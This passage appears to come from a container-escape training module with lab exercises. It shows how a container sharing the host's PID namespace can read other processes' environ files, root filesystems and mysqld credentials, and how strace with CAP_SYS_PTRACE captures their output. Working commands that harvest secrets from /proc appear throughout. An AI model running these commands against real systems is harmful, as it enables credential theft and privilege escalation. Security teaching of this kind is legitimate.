PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cli_leakerHOME=/root
victim:/proc/41594# ls root/
bin            lib            root           tmp
dev            media          run            usr
entrypoint.sh  mnt            sbin           var
etc            opt            srv
home           proc           sys

victim:/proc/41594# cat root/entrypoint.sh
#!/bin/sh

while command
do
   curl -H "APIKEY: $1" http://backend/clean
   sleep 10
done
```

> Listing 32 - Inspecting environ and root

The **environ** file has the variables separated with a null terminator instead of a new line. Although the variables for this process don't contain any useful information, the **root** directory does. In the **root** directory, we can find the contents of **entrypoint.sh**. This information might allow us to further escalate into the environment.

With access to the **root** directory, we can also write contents to the processes' file system. This may result in the ability to privilege escalate to another container or into the host.

While this process didn't have any useful information in the **environ** file, other processes might. Let's create a quick script that will loop through all **environ** files and retrieve the contents.

```
01 for e in $(ls /proc/*/environ); 
02 do 
03    echo "----------"; 
04    echo $e; 
05    cat $e| tr '\0' '\n'; 
06 done > envs.txt
```

> Listing 33 - Script for Looping Environment Variables

The script in the Listing above will start by looping through all **environ** entries in the **proc** file system. For each process, we'll add a separator (line 3) and echo the **environ** file we're indexing. On line 5, we'll get the contents of the file, but we'll translate all null characters using a new line. Finally, we'll save the output to **envs.txt**

Let's condense our script into a single line and execute it in the container.

```
victim:/# for e in $(ls /proc/*/environ); do echo; echo $e; cat $e| tr '\0' '\n'; done > envs.txt
cat: can't open '/proc/1/environ': Permission denied
...
cat: can't open '/proc/871/environ': Permission denied
```

> Listing 34 - Running Script to Loop environ Entrys

Even though we're running as _root_ in the container, processes that lack the CAP_SYS_PTRACE capability cannot read the process information of processes running as another user. These processes will throw a "Permission Denied" error. We can, however, find the root processes that we were allowed to read in **envs.txt**.

```
victim:/# cat envs.txt
...

/proc/40553/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=env_leaker
USER=admin
PASSWORD=VignVjZ5n6LHd7N28ywqw9dO
API=96ae5761-966e-41a9-a809-021fbfe6facc
HOME=/root
...
victim:/#
```

> Listing 35 - Reviewing Environment Variables

While reviewing the environment variables, we'll find another set of credentials that might be useful. It's become common for processes to be configured using environment variables. For example, the MySQL container image[1](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_153-1) might have its password for root configured via environment variables. Let's inspect the mysqld process we found earlier.

Let's find the process ID again and investigate its **environ** entry.

```
victim:/# ps | grep mysqld
40554 999       1:51 mysqld
54640 root      0:00 grep mysqld

victim:/# cd /proc/40554

victim:/proc/40554# cat environ
cat: can't open 'environ': Permission denied
```

> Listing 36 - Permission Denied when Accessing Environ

The MySQL process doesn't allow us to read the process information. This is because the MySQL container runs MySQL with a user ID of 999. Since this is different from our user ID (0), we cannot access its information. If we wanted to access it, we'd need to have access to the CAP_SYS_PTRACE capability. Let's verify that we don't have that capability. The victim container has access to the **capsh** binary that we can use with **--print** to display the capabilities.

```
victim:~# capsh --print
Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep
...
victim:~# 
```

> Listing 37 - Finding that Current Victim Does not have CAP_SYS_PTRACE

The output does not show that we have access to CAP_SYS_PTRACE. However, for the purposes of demonstration, we have access to another container on port 2223, which shares the host's PID namespace and has the required capabilities. Let's connect to this container via SSH.

```
victim:~# exit
Connection to sandbox closed.

kali@kali:~$ ssh -p 2223 root@sandbox
root@sandbox's password:
Welcome to Alpine!
....

victim_ptrace:~# 
```

> Listing 38 - Logging into Victim with CAP_SYS_PTRACE

Next, let's verify that we do indeed have the CAP_SYS_PTRACE capability and attempt to view the mysqld **environ** contents.

```
victim_ptrace:~# capsh --print
Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap=ep
...

victim_ptrace:~# cat /proc/40554/environ
MYSQL_PASSWORD=passwordHOSTNAME=12042c4d929cMYSQL_DATABASE=dbMYSQL_ROOT_PASSWORD=passwordPWD=/HOME=/var/lib/mysqlMYSQL_MAJOR=8.0GOSU_VERSION=1.14MYSQL_USER=userMYSQL_VERSION=8.0.30-1.el8SHLVL=0MYSQL_ROOT_HOST=%PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binMYSQL_SHELL_VERSION=8.0.30-1.el8
```

> Listing 39 - Verifying CAP_SYS_PTRACE and Viewing Environ

As shown in the listing above, we _do_ have the CAP_SYS_PTRACE capability, and we can now view the process information for mysqld. This displays the root password to access the database.

The CAP_SYS_PTRACE capability is even more dangerous than just allowing us to view the **environ** entry. This capability allows us to debug and trace applications, and potentially even execute commands. To demonstrate this, let's inspect the previously-discovered logger process and attempt to read what it's printing to the console.

To read what content it writes to standard out, standard error, or any other files, we'll need to find any calls to the _write_ syscall.

First, we'll find the process ID again by using **ps** and **grep** to search for **logger**. Next, we'll use **strace** to trace the application. We'll specify that we want to find the **write** syscall with the **-e** option. Next, we'll specify the process ID with **-p**. By default, **strace** will only display 32 characters of string arguments. To display more, we can set the limit to **128** using **-s**.

```
victim_ptrace:~# ps | grep logger
40764 root      0:00 {logger.sh} /bin/sh /logger.sh 100 5000
64836 root      0:00 grep logger

victim_ptrace:~# strace -e write -p 40764 -s 128
strace: Process 40764 attached
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=557, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=558, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=559, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
write(1, "2022-10-06T22:20:18+0000 INFO rsvp_flow_stateMachine: state SESSIONED, event PATHDELTA\n", 87) = 87
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=560, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=561, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=564, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=565, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=566, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
write(1, "2022-10-06T22:20:22+0000 ERROR Soft device bus error recovered by the IOA\n", 74) = 74
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=567, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=568, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=571, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=572, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=573, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
write(1, "2022-10-06T22:20:23+0000 DEBUG entity_initialize: interface 9.67.116.98, entity for rsvp allocated and initialized\n", 115) = 115
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=581, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=582, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
```

> Listing 40 - Viewing Output of Logger

From here, we can find the contents of all calls to the _write_ syscall. It's important to note that output should be closely reviewed for sensitive content. It's common to find verbose errors that may contain secrets that can result in elevated privileges.

The access provided by CAP_SYS_PTRACE is even more powerful than demonstrated here. We can leverage this access with the host's PID namespace to achieve remote code execution. However, exploitation of this is outside the scope and level of this Module.

1

(Docker Hub, 2022), [https://hub.docker.com/r/mysql/mysql-server](https://hub.docker.com/r/mysql/mysql-server) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_153-1)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

|   |   |   |
|---|---|---|
|Container - Host PID - 1|||
|Container - Host PID - 2|||
|Container - Host PID - 3|||
|Container - Host PID - 4|||

#### Labs

1. Using VM "Container - Host PID - 1", discover the flag by reviewing the processes on the host. The flag maybe in the CLI arguments, environment variables, root file system, or output to stdout in any of the processes. The format of the flag will follow the standard format of OS{...}.

Answer

2. Using VM "Container - Host PID - 2", discover the flag by reviewing the processes on the host. The flag maybe in the CLI arguments, environment variables, root file system, or output to stdout in any of the processes. The format of the flag will follow the standard format of OS{...}.

Answer

3. Using VM "Container - Host PID - 3", discover the flag by reviewing the processes on the host. The flag maybe in the CLI arguments, environment variables, root file system, or output to stdout in any of the processes. The format of the flag will follow the standard format of OS{...}.

Answer

4. Using VM "Container - Host PID - 4", discover the flag by reviewing the processes on the host. The flag maybe in the CLI arguments, environment variables, root file system, or output to stdout in any of the processes. The format of the flag will follow the standard format of OS{...}.